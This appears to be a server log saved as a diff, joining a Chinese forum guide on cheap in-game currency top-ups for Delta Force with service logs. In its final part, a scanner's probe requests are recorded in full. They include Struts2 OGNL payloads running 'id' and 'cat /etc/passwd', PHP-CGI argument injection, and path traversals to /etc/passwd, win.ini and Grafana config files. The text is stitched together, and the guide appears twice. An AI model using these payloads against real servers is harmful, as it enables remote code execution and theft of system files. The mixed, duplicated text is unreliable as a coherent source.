+[![盛夏狂欢季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 每次大更新都有这种活动
+
+**4）全新赛季-破壁 - 限时活动（已结束）**
+
+①商城满100-5优惠券，免费  
+②悦享卡满98-5优惠券，免费
+
+[![破壁赛季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+[![活动奖品](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+=============================
+
+3、淘宝赠礼（中风险，零性价比）
+
+价格问题，一般超过8折不建议；
+
+=============================
+
+4、市场出售高价皮肤（中风险，禁市场）
+
+风险较高，市场交易异常警告！
+
+参考文献∶求助  
+[![被洗号](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 悲剧
+
+=============================
+
+5、全平台代充（高风险，余额变负）
+
+不接受，详情阅读用户条款，风险较高，容易被追缴
+
+> 充别怂，被洗别叫，被封别闹
+
+参考文献∶被洗号了怎么办 [cube_哭泣...]
+
+=============================
+
+6、市场抢枪皮赌合成（高风险，不建议）
+
+即市场抢购S4 或 S5赛季的紫色品质皮肤 *20 合成一个金色皮肤；类似CS炼金
+
+[![优品合成](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 已连续9把优品，量力而行
+
+**第一幕：雄心壮志**
+
+"这次一定要抢到S级！"你摩拳擦掌守在电脑前，手指悬在左键上方疯狂点击。倒计时结束的瞬间——  
+"怎么回事？关注了这么多S，怎么一个都抢不到啊？！"
+
+**第二幕：退而求其次**
+
+"算了算了，肯定全是脚本S抢不到正常，A也行吧..."你擦了擦汗，调整策略准备第二轮。结果——  
+"不是吧！A怎么也抢不到？！怎么全是假购买，被槟榔做局了，哎资本"
+
+**第三幕：彻底崩溃**
+
+看着空空如也的重组界面，你颤抖着点开B级页面：  
+"要不......B？"
+
+**最终幕：人间真实**
+
+第二天，你在小黑盒看到有人晒出合成的气象感应极品S腾龙，配文："随便点点就抢到了20个S，1打19出极品S很难吗？"  
+你默默退出软件，打开心悦俱乐部，“648->充值”，优品QBZ
+
+=============================
+
+总结：360~390赠礼可买，超过的建议心悦俱乐部充值或自己搬砖；
+
+=============================
+
+祝大家局内把把出红合成把把极品
+
+[![欧气分享](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 吸口朋友2打18的欧气
+
+[![三角洲行动北极星](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)  
+三角洲行动北极星  
+[![三角洲新赛季](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)  
+三角洲新赛季
+2025-09-23 21:28:42.683 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：5933字
+2025-09-23 21:29:20.257 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 4407 input + 2774 output = 7181 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:37406 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 21:30:21.308 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：三角洲电锯/北极星氪金指南：低成本拿下，别当大冤种！！
+
+[![作者头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)
+大肥羊玖崇  
+Lv.21  
+2025-07-05 ·湖南
+
+[![三角洲行动 Banner](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)
+
+> 官方直充648元享8折优惠，当前合理赠礼价格为350-390元。价格过高不建议购买，自行充值更为划算。后续推出的联动皮肤抽奖内容无法通过赠礼获得。
+
+## 一、货币概念
+
+1. 三角币：RMB充值后获取的货币，1:10； 可购买：市场、通行证、三角券物品；
+2. 三角券：通行证返利、市场出售枪皮；可购买：捆绑包，不可购买市场物品
+3. 曼德尔币：三角币1：1购买；可购买：任意曼德尔砖
+
+## 二、赠礼规则
+
+> 1. **双方要求**：
+>    * 等级 ≥ 20
+>    * 好友 ≥ 24小时 × 5天
+> 2. **次数限制**：
+>    * 卖家：每月最多赠5次<3W券总价
+>    * 买家：每月最多收5次<3W券总价
+> 3. **通行证赠礼**：仅能用【三角币】赠送
+
+## 三、获取途径
+
+目前强烈推荐的是【350~390】的价格，超过此价格不建议购买；
+
+1）官方648充值可得8100三角币（约8折），520元折算后416元，超过390建议自充；
+
+2）警惕低价陷阱，人家能卖高价为什么平白无故卖你低价？
+
+### 心悦俱乐部充值（推荐指数：★★★★）
+
+心悦俱乐部是当前腾讯系游戏官方充值最优惠的地方；
+
+[![心悦俱乐部尊享商场位置](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 位置：首页 - 顶部尊享商场
+
+#### 1）悦享卡【月卡制】 - 需要每天APP内签到
+① 98档（73折），980币+量子密钥(60币) + 10币 × 30天，一共可得1340币，98 / 1340  ≈ 73折（要满勤）
+② 198档（75折），1980币+量子密钥(60币) + 20币 × 30天，一共可得2640币，198 / 2640 ≈ 75折（要满勤）
+
+[![悦享卡示意图](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 你今天的悦享卡领了吗！
+
+[![悦享卡领取页面](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 每月保留节目
+
+#### 2）小黑卡 【日购制，每天两次】
+① 98档（85折），1080币+量子密钥(60币)+俱乐部时尚小垃圾
+
+[![小黑卡应急卡页面](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 应急卡
+
+#### 3）盛夏狂欢季 - 限时活动（已结束）
+①0.05R购买小黑卡98-5优惠券  
+②0.08R购买198-8优惠券  
+③***R购买648-32优惠券（每次大更新都有648减免活动，这次没买到不知道价格）  
+④星愿币抽奖应该能拿到1元/10元现金兑换券
+
+[![盛夏狂欢活动页面](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 每次大更新都有这种活动
+
+#### 4）全新赛季-破壁 - 限时活动（已结束）
+①商城满100-5优惠券，免费  
+②悦享卡满98-5优惠券，免费
+
+[![破壁赛季活动页面一](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+[![破壁赛季活动页面二](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 每次大更新都有这种活动
+
+=============================
+
+3、淘宝赠礼（中风险，零性价比）
+价格问题，一般超过8折不建议；
+
+=============================
+
+4、市场出售高价皮肤（中风险，禁市场）
+风险较高，市场交易异常警告！
+
+[![市场交易异常警告](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 悲剧
+
+=============================
+
+5、全平台代充（高风险，余额变负）
+不接受，详情阅读用户条款，风险较高，容易被追缴
+
+> 充别怂，被洗别叫，被封别闹
+
+参考文献：被洗号了怎么办[cube_哭泣...]
+
+=============================
+
+6、市场抢枪皮赌合成（高风险，不建议）
+即市场抢购S4 或 S5赛季的紫色品质皮肤 ×20 合成一个金色皮肤；类似CS炼金
+
+[![优品合成示例](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 已连续9把优品，量力而行
+
+> **第一幕：雄心壮志**
+> 
+> "这次一定要抢到S级！"你摩拳擦掌守在电脑前，手指悬在左键上方疯狂点击。倒计时结束的瞬间——
+> 
+> "怎么回事？关注了这么多S，怎么一个都抢不到啊？！"
+> 
+> **第二幕：退而求其次**
+> 
+> "算了算了，肯定全是脚本S抢不到正常，A也行吧..."你擦了擦汗，调整策略准备第二轮。结果——
+> 
+> "不是吧！A怎么也抢不到？！怎么全是假购买，被槟榔做局了，哎资本"
+> 
+> **第三幕：彻底崩溃**
+> 
+> 看着空空如也的重组界面，你颤抖着点开B级页面：
+> 
+> "要不......B？"
+> 
+> **最终幕：人间真实**
+> 
+> 第二天，你在小黑盒看到有人晒出合成的气象感应极品S腾龙，配文："随便点点就抢到了20个S，1打19出极品S很难吗？"
+> 
+> 你默默退出软件，打开心悦俱乐部，“648->充值”，优品QBZ
+
+=============================
+
+总结：360~390赠礼可买，超过的建议心悦俱乐部充值或自己搬砖；
+
+=============================
+
+祝大家局内把把出红合成把把极品
+
+[![欧气晒图](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+#### 吸口朋友2打18的欧气
+
+[![三角洲行动北极星宣传图](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)  
+三角洲行动北极星
+[![三角洲新赛季宣传图](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)  
+三角洲新赛季
+2025-09-23 21:30:21.308 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：5979字
+2025-09-23 21:30:59.856 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 4443 input + 2433 output = 6876 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:42234 - "POST /extract-style HTTP/1.1" 200 OK
+INFO:     9.135.100.135:55204 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:40850 - "OPTIONS / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:32904 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:56958 - "GET http%3A//9.139.82.162/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:56984 - "GET http%3A//10.99.229.178/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57002 - "GET http%3A//9.218.232.52/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57148 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:57514 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57572 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57628 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57672 - "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57672 - "POST /run HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:57672 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57672 - "GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57804 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57812 - "POST /user.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57810 - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57818 - "POST /scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57836 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57858 - "GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57890 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57922 - "GET /login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57950 - "GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57976 - "GET /index.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57980 - "POST /?q=node&destination=node HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57982 - "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58002 - "PUT /fileserver/336iEb15N19tSpdeNloGnEzZiZ3.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58006 - "GET /login.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58030 - "GET /fileserver/336iEb15N19tSpdeNloGnEzZiZ3.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58038 - "GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58144 - "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58148 - "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58156 - "PUT /_users/org.couchdb.user%3Apoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58154 - "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58188 - "POST /integration/saveGangster.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58196 - "POST /invoker/readonly HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58308 - "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58326 - "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58348 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58442 - "GET /?id=DqjacP%25{128*128} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58454 - "GET /solr/admin/cores?wt=json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58470 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58492 - "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58680 - "POST /jars/upload HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58700 - "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58740 - "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58744 - "GET /lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58766 - "GET /lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58820 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58846 - "GET /_async/favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59076 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59104 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59122 - "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59130 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59132 - "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59142 - "POST /v6.58/Products/Authentication HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59160 - "POST /services/messagebroker/streamingamf HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59246 - "GET /config HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59256 - "POST /app/rest/users/id%3A1/tokens/336iEcNJgvbJlKTm2iqJXI3AZwb%3B.jsp?jsp_precompile=true HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59260 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59264 - "POST /component_server HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59288 - "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59314 - "GET /streampipes-backend/api/openapi.json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59384 - "GET /api/data HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59382 - "GET /tmp/temp.db%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
